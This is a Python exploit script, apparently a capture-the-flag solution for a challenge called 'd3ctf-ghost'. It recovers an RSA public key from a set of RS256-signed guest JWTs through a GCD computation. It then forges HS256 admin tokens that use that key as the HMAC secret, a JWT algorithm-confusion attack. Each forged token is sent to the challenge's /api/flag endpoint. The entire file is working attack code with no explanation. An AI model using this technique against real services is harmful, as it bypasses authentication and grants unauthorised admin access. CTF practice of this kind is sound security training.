#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import math
import time
import urllib.request
import gmpy2
from Crypto.PublicKey import RSA

BASE = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"
E = 65537
SHA256_DER = bytes.fromhex("3031300d060960864801650304020105000420")


def b64u_decode(text):
    return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))


def b64u(data):
    if not isinstance(data, bytes):
        data = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def emsa(message, size):
    digest = hashlib.sha256(message).digest()
    t = SHA256_DER + digest
    return b"\x00\x01" + b"\xff" * (size - len(t) - 3) + b"\x00" + t


tokens = [line.strip() for line in open("work/d3ctf-ghost/guest-tokens.txt") if line.strip()]
values = []
size = len(b64u_decode(tokens[0].split(".")[2]))
for token in tokens:
    head, body, sig = token.split(".")
    message = f"{head}.{body}".encode()
    s = gmpy2.mpz(int.from_bytes(b64u_decode(sig), "big"))
    m = gmpy2.mpz(int.from_bytes(emsa(message, size), "big"))
    values.append((s ** E) - m)

n = abs(values[0])
for value in values[1:]:
    n = gmpy2.gcd(n, abs(value))

for small in range(2, 10000):
    while n.bit_length() > size * 8 and n % small == 0:
        n //= small

n = int(n)
key = RSA.construct((n, E))
pub_pem = key.publickey().export_key("PEM")
pub_der = key.publickey().export_key("DER")
open("work/d3ctf-ghost/recovered-rs256-public.pem", "wb").write(pub_pem)
print(f"n_bits={n.bit_length()}")
print(pub_pem.decode())

now = int(time.time())
payload = {
    "typ": "access",
    "role": "admin",
    "sub": "ops-root",
    "iss": "ghost-packet-auth",
    "aud": "ghost-packet-api",
    "iat": now,
    "exp": now + 1800,
}

def hs_token(secret, kid="primary-rs256"):
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    signing_input = f"{b64u(header)}.{b64u(payload)}"
    sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64u(sig)

for label, secret in [
    ("pem", pub_pem),
    ("pem_stripped_lf", pub_pem.replace(b"\n", b"")),
    ("der", pub_der),
    ("n_decimal", str(n).encode()),
    ("n_hex", format(n, "x").encode()),
]:
    token = hs_token(secret)
    req = urllib.request.Request(f"{BASE}/api/flag", headers={"Authorization": f"Bearer {token}", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read().decode()
            print(label, resp.status, text)
    except urllib.error.HTTPError as e:
        text = e.read().decode()
        if e.code != 401:
            print(label, e.code, text)
